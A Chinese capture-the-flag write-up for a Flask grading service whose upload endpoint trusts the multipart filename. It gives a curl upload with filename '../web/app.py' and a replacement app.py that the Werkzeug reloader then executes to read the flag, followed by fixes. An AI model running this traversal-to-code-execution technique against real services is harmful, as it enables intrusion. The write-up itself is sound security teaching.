# 禁止内卷

## 题目简述

评分站的 `POST /submit` 接收 JSON 文件，用上传文件名直接构造保存路径：

```python
filename = file.filename
filepath = os.path.join("/tmp/uploads", filename)
file.save(filepath)
```

程序没有调用 `secure_filename()`，也没有在保存前规范化并校验最终路径。服务的工作目录是 `/tmp/web`，通过 `flask run --reload --host 0` 启动；Werkzeug reloader 会监视 Python 源码变化并重启应用。因此 multipart 中的攻击者可控 `filename` 可以路径穿越覆盖 `/tmp/web/app.py`，并借自动重载执行新代码。

flag 原文不直接出现在正常评分结果里。启动脚本先读 `/flag`，将每个字符转成 `ord(ch) - 65`，放在 `/tmp/web/answers.json` 的列表头部，再填充到 500 项。要恢复 flag，必须读取这个原始 JSON，而不是使用 `get_answer()` 将负数截为 0 后的结果。

## 解题过程

先准备一个最小 Flask 应用作为覆盖内容。它读取原始 `answers.json`，把列表头部按题意加 65 还原，并在遇到 `}` 后停止：

```python
from flask import Flask
import json

app = Flask(__name__)

@app.get("/")
def index():
    with open("/tmp/web/answers.json", "r", encoding="utf-8") as f:
        values = json.load(f)

    out = []
    for value in values:
        ch = chr(value + 65)
        out.append(ch)
        if ch == "}":
            break
    return "".join(out), 200, {"Content-Type": "text/plain; charset=utf-8"}
```

然后构造 multipart 请求，本地文件内容是上述 Python，但服务端看到的文件名应是能从 `/tmp/uploads` 穿越到工作目录的 `../web/app.py`：

```bash
curl -sS -X POST 'http://TARGET/submit' \
  -F 'file=@payload.py;filename=../web/app.py'
```

`os.path.join('/tmp/uploads', '../web/app.py')` 解析到 `/tmp/web/app.py`。`file.save()` 覆盖原应用后，reloader 检测到变化并重启。等待短暂重启后访问根路由：

```bash
curl -sS 'http://TARGET/'
```

响应即为还原后的 flag。如果上传响应中断或出现短暂连接失败，通常是 reloader 已终止旧进程，并不代表覆盖失败。新路由能输出以 `flag{` 开头、以 `}` 结尾的文本，即可完成验证。

题目也暴露了平方误差 oracle，但它不是稳定的主解：`get_answer()` 会把负数项改为 0，而原 flag 中某些字符经 `ord(ch)-65` 后恰为负数，因此仅根据评分回显不能完整恢复原文。

## 方法总结

- 核心技巧：通过 multipart `filename` 路径穿越覆盖 Flask 入口，再借开启的 reloader 自动执行攻击者代码。
- 识别信号：未清洗的上传文件名直接交给 `os.path.join` / `save`，应用源码又位于可写目录并由 `--reload` 监视。
- 复用要点：文件名是攻击者输入，应去掉路径成分并校验规范化后的目标仍在上传根目录内；生产环境不应开启自动重载，更不应让运行用户可覆盖应用代码。
